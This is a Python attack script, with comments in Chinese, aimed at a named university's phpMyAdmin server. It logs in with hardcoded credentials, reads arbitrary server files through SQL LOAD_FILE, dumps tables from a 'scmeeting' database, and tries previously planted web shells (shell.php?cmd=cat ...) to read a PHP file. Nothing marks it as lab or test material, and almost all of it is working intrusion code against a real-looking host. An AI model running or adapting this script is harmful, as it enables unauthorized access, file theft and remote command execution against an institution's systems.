#!/usr/bin/env python3
import requests
import re
import html
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

# 方法1: 直接HTTP访问
print("[*] 方法1: 直接HTTP访问...")
test_urls = [
    "https://olympic.su.ac.th/banpot/scmeeting/x.php",
    "https://olympic.su.ac.th/scmeeting/x.php",
    "https://olympic.su.ac.th/phpmyadmin/../banpot/scmeeting/x.php",
]
for test_url in test_urls:
    resp = requests.get(test_url, verify=False, timeout=5)
    if resp.status_code == 200 and len(resp.text) > 10:
        print(f"[+] 找到: {test_url}")
        print(resp.text[:1000])
        exit(0)

# 方法2: 通过SQL读取文件
print("[*] 方法2: SQL LOAD_FILE...")
paths = [
    "/var/www/html/banpot/scmeeting/x.php",
    "/var/www/banpot/scmeeting/x.php",
    "/home/www/html/banpot/scmeeting/x.php",
    "/usr/share/nginx/html/banpot/scmeeting/x.php",
]

for path in paths:
    sql_data = {"sql_query": f"SELECT LOAD_FILE('{path}');", "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 提取内容
    content_match = re.search(r'<td[^>]*class=["\']value["\'][^>]*>(.*?)</td>', resp.text, re.DOTALL | re.IGNORECASE)
    if content_match:
        content = html.unescape(content_match.group(1))
        content = re.sub(r'<[^>]+>', '', content).strip()
        if content and content != 'NULL' and len(content) > 10:
            print(f"[+] 找到文件: {path}")
            print("=" * 70)
            print(content)
            print("=" * 70)
            exit(0)

# 方法3: 查看scmeeting数据库，可能有文件路径信息
print("[*] 方法3: 查询scmeeting数据库...")
sql_data = {"sql_query": "SHOW TABLES;", "db": "scmeeting"}
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
tables = re.findall(r'<td[^>]*>(.*?)</td>', resp.text)
for table in tables[:5]:
    table_clean = re.sub(r'<[^>]+>', '', table).strip()
    if table_clean:
        print(f"  表: {table_clean}")
        # 查询表内容
        sql_data = {"sql_query": f"SELECT * FROM `{table_clean}` LIMIT 10;", "db": "scmeeting"}
        resp2 = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
        if 'x.php' in resp2.text or '/banpot' in resp2.text:
            print(f"[+] 在表 {table_clean} 中找到路径信息")
            print(resp2.text[:500])

# 方法4: 通过PHP代码执行读取
print("[*] 方法4: 尝试通过已有shell读取...")
# 先检查是否有shell
shell_urls = [
    "https://olympic.su.ac.th/shell.php?cmd=cat /var/www/html/banpot/scmeeting/x.php",
    "https://olympic.su.ac.th/phpmyadmin/shell.php?cmd=cat /var/www/html/banpot/scmeeting/x.php",
]
for shell_url in shell_urls:
    try:
        resp = requests.get(shell_url, verify=False, timeout=5)
        if '<?php' in resp.text or 'system' in resp.text:
            print(f"[+] 通过shell读取: {shell_url}")
            print(resp.text[:500])
            exit(0)
    except:
        pass

print("[-] 所有方法尝试完毕")
